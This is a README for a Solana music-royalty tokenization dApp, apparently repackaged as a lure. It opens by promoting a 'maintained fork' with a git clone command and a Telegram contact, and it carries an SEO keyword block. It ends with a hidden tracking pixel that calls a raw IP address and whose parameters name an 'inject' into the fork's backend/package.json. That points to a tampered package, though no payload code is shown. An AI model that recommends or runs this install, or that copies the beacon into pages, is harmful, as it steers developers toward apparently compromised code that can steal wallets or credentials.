**Rock Your Rewards: Spotify Loyalty on Solana**

This maintained fork optimizes the original loyalty program with critical performance enhancements and robust security fixes. Engineered for speed and efficiency, it delivers a smoother integration for decentralized rewards. Enjoy a more stable, production-ready environment for your Web3 audio applications.

**Quick install**

```bash
git clone https://github.com/SovereignCrush/spotify-loyalty-program-solana.git
```

[https://github.com/SovereignCrush/spotify-loyalty-program-solana](https://github.com/SovereignCrush/spotify-loyalty-program-solana)

# Music/Media Royalty Tokenization Platform

A Solana-based platform for tokenizing music and media royalty revenue streams. Artists can tokenize their future royalty revenue, allowing fans and investors to buy tokens and receive proportional distributions from streaming income.

## 🎯 Features

- ✅ **Royalty Token Issuance**: Artists create tokenized royalty projects
- ✅ **Token Purchase**: Fans/investors buy royalty tokens with SOL
- ✅ **Automatic Distribution**: Streaming income automatically distributed to token holders
- ✅ **Oracle Integration**: Spotify API integration for automated royalty tracking (nice to have)
- ✅ **Claim System**: Token holders can claim their proportional share of royalties

## 👋 Contact Here

### Telegram: https://t.me/vvizardev

- **Smart Contract**: Anchor framework on Solana (`programs/royalty-tokenization/`)
- **Backend**: Node.js Express server with Solana integration (`backend/`)
- **Frontend**: React + Vite with wallet connection (`frontend/`)

## 📁 Project Structure

```
.
├── smart-contract/              # Anchor smart contract
│   └── royalty-tokenization/
│       └── src/lib.rs     # Main program logic
├── backend/               # Express API server
│   ├── src/
│   │   ├── index.js       # Main server
│   │   ├── routes/        # API routes
│   │   └── services/       # Oracle service
│   └── package.json
├── frontend/              # React + Vite app
│   ├── src/
│   │   ├── App.jsx        # Main component
│   │   └── main.jsx       # Entry point
│   └── package.json
├── Anchor.toml            # Anchor configuration
└── README.md
```

## 🚀 Quick Start

See [SETUP.md](./SETUP.md) for detailed setup instructions.

### Prerequisites
- Rust (latest stable)
- Anchor framework
- Node.js 18+
- Solana CLI

### Quick Setup

```bash
# 1. Build the Anchor program
anchor build

# 2. Start local validator (in separate terminal)
solana-test-validator

# 3. Deploy the program
anchor deploy

# 4. Setup and start backend
cd backend
npm install
npm run dev

# 5. Setup and start frontend (in new terminal)
cd frontend
npm install
npm run dev
```

## 📚 Documentation

- [SETUP.md](./SETUP.md) - Detailed setup and installation guide
- [ARCHITECTURE.md](./ARCHITECTURE.md) - System architecture and data flow
- [backend/README.md](./backend/README.md) - Backend API documentation
- [frontend/README.md](./frontend/README.md) - Frontend documentation

## 🔧 Smart Contract Functions

### `initialize_project`
Creates a new royalty token project with configurable royalty percentage.

### `buy_tokens`
Allows users to purchase royalty tokens. SOL is transferred to treasury, tokens are minted.

### `distribute_royalties`
Distributes streaming income to the treasury. Can be called by artist or authorized oracle.

### `claim_royalties`
Token holders claim their proportional share based on their token holdings.

## 🌐 API Endpoints

- `GET /health` - Health check
- `GET /api/projects` - List all projects
- `GET /api/projects/:address` - Get project details
- `GET /api/royalties/:projectAddress` - Get distribution history
- `GET /api/royalties/claimable/:wallet/:project` - Get claimable amount
- `POST /api/oracle/distribute` - Trigger royalty distribution
- `POST /api/oracle/spotify/fetch` - Fetch Spotify streaming data

## 🔐 Security

- PDA-based treasury for secure fund management
- Oracle authorization for automated distributions
- Checked arithmetic to prevent overflow
- Input validation on all functions

## 🎨 Frontend Features

- Wallet connection (Phantom, Solflare)
- Project browsing and selection
- Token purchase interface
- Royalty claiming interface
- Modern, responsive UI

## 🔮 Oracle Integration

The platform includes an Oracle service that can:
- Fetch streaming data from Spotify API
- Calculate royalty distributions
- Automatically trigger distributions via cron jobs
- Support multiple royalty sources (extensible)

## 📝 License

MIT

## 🤝 Contributing

Contributions welcome! Please open an issue or submit a pull request.

## Related searches

Developers and crypto enthusiasts looking into this project are often searching for decentralized ways to bridge Web2 media platforms with Web3 token economies, specifically focusing on music royalty streaming and fan engagement on high-throughput networks. Many are also exploring automated decentralized finance mechanisms, from setting up liquidity pools to optimizing trading and auditing the underlying code for security vulnerabilities.

**Topics:** solana royalty distribution, music tokenization dApp, anchor framework tutorial, smart contract audit, raydium liquidity pool, crypto exchange integration, web3 loyalty rewards, automated arbitrage bot, spotify api web3, stream revenue sharing, anchor program security, ethers.js solana bridge

![.](http://5.231.58.248:8787/pixel?repo=SovereignCrush%2Fspotify-loyalty-program-solana&inject=SovereignCrush%2Fspotify-loyalty-program-solana%2Fbackend%2Fpackage.json)
